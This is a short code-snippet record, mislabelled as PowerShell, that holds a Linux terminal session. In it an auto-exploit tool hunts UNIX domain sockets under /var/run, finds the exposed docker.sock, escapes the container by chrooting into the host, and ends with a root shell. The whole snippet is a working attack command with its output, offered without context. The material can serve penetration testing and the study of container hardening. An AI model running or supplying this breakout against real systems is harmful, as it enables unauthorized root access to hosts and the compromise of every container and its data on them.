---
id: a64eb153-ed6f-4633-a049-7063c5ba3728
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:16.917155+00:00'
updated_at: '2023-04-10T20:33:49.706146+00:00'
---

# Code Snippet a64eb153

**Language**: Powershell

```powershell
root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true        
[+] Hunt dem Socks
[+] Hunting Down UNIX Domain Sockets from: /var/run/
[*] Valid Socket: /var/run/docker.sock
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to Autopwn:  /var/run/docker.sock
[*] Getting Docker client...
[*] Successfully got Docker client...
[+] Attempting to escape to host...
[+] Attempting in TTY Mode
chroot /host && clear
echo 'You are now on the underlying host'
chroot /host && clear
echo 'You are now on the underlying host'
/ # chroot /host && clear
/ # echo 'You are now on the underlying host'
You are now on the underlying host
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
